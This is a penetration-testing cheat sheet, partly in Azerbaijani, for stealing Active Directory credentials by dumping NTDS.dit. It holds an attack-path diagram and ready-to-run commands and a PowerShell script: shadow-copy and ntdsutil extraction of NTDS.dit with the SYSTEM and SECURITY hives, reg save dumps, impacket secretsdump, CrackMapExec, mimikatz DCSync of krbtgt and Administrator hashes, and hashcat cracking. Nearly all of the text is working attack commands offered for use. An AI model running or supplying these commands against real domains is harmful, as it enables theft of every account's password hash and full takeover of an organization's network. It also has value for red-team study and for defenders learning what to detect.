# NTDS.dit
```powershell

# NTDS Path
C:\Windows\NTDS\ntds.dit

ntds.dit (ESE Database)
├── datatable          ← Bütün AD obyektləri (user, group, computer)
│   ├── ATTk589990     ← unicodePwd (encrypted NT hash)
│   ├── ATTm590045     ← sAMAccountName
│   └── ATTq589983     ← objectGUID
├── link_table         ← Group membership-lər
└── sd_table           ← Security descriptorlar

┌─────────────────────────────────────────────────────────┐
│                   ATTACK PATHS                          │
│                                                         │
│  [Attacker]                                             │
│      │                                                  │
│      ├──► DCSync (DRSUAPI)  ──────────────────────────► │
│      │         Requires: DS-Replication rights          │
│      │                                                  │
│      ├──► Remote secretsdump ──► SMB/WMI ─────────────► │
│      │         Requires: Admin rights on DC             │
│      │                                                  │
│      └──► Physical/RDP on DC                            │
│               │                                         │
│               ├──► VSS Copy ──────────────────────────► │
│               ├──► ntdsutil IFM ──────────────────────► │
│               └──► NTDSDumpEx ─────────────────────────►│
│                                                         │
│                          ▼                              │
│               [NTDS.dit + SYSTEM hive]                  │
│                          │                              │
│               impacket secretsdump (offline)            │
│                          │                              │
│               [NT Hashes / Cleartext / Kerberos]        │
└─────────────────────────────────────────────────────────┘

# Shadow Copy
vssadmin list shadows ( List Available Shadows )

vssadmin create shadow /for=C:   -->   \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
cmd /c mklink /d C:\shadow_drive \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\

copy C:\shadow_drive\Windows\System32\NTDS\ntds.dit C:\exfil\NTDS.dit
copy C:\shadow_drive\Windows\System32\config\SYSTEM C:\exfil\SYSTEM
copy C:\shadow_drive\Windows\System32\config\SECURITY C:\exfil\SECURITY

┌──────────────────────────────────────────────────────────────────────────┐
$shadow = (Get-WmiObject -List Win32_ShadowCopy).Create("C:\","ClientAccessible")
$shadowPath = (Get-WmiObject Win32_ShadowCopy | 
    Where-Object {$_.ID -eq $shadow.ShadowID}).DeviceObject + "\"
# Faylları kopyala
$items = @(
    "Windows\NTDS\NTDS.dit",
    "Windows\System32\config\SYSTEM",
    "Windows\System32\config\SECURITY"
)
foreach ($item in $items) {
    $src = Join-Path $shadowPath $item
    $dst = "C:\Temp\" + (Split-Path $item -Leaf)
    cmd /c "copy `"$src`" `"$dst`""
}
Write-Host "[+] Fayllar C:\Temp\ qovluğuna kopyalandı"
└────────────────────────────────────────────────────────────────────────────┘

# reg.exe ilə SYSTEM Live Dump
reg save HKLM\SYSTEM C:\Temp\SYSTEM
reg save HKLM\SECURITY C:\Temp\SECURITY

# Offline Hash Extraction (Impacket)
impacket-secretsdump -ntds NTDS.dit -system SYSTEM -security SECURITY LOCAL

# Müxtəlif output formatları
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL \
    -outputfile /tmp/hashes \
    -history          # Password History
    -just-dc-ntlm     # YOnly NTLM Hashes
    -just-dc-user "Administrator"  # Only one user

# NTDSUTIL
ntdsutil
ntdsutil: activate instance ntds
ntdsutil: ifm
ifm: create full C:\Temp\IFM
ifm: quit
ntdsutil: quit

C:\Temp\IFM\
├── Active Directory\
│   └── ntds.dit          ← Burada!
└── registry\
    ├── SYSTEM             ← Burada!
    └── SECURITY           ← Burada!

# Impacket
impacket-secretsdump DOMAIN/Administrator:Password123@10.10.10.1
impacket-secretsdump -hashes :aad3b435b51404eeaad3b435b51404ee:8f4daccd8e20c43a88b24f69da65d9c5 DOMAIN/Administrator@10.10.10.1

# CrackMapExec
crackmapexec smb 10.10.10.1 -u Administrator -p Password123 --ntds
crackmapexec smb 10.10.10.1 -u Administrator -H 8f4daccd8e20c43a88b24f69da65d9c5 --ntds

# Mimikatz
Need Privilege:
   DS-Replication-Get-Changes + DS-Replication-Get-Changes-All

mimikatz # privilege::debug
mimikatz # lsadump::dcsync /domain:DOMAIN.LOCAL /all /csv
mimikatz # lsadump::dcsync /domain:DOMAIN.LOCAL /user:Administrator
mimikatz # lsadump::dcsync /domain:DOMAIN.LOCAL /user:krbtgt

# Hashcat
cut -d ":" -f 4 hashes.txt > nt_hashes.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt

# DCSync
secretsdump.py -just-dc-user krbtgt company.local/admin@DC-IP
python3 secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```
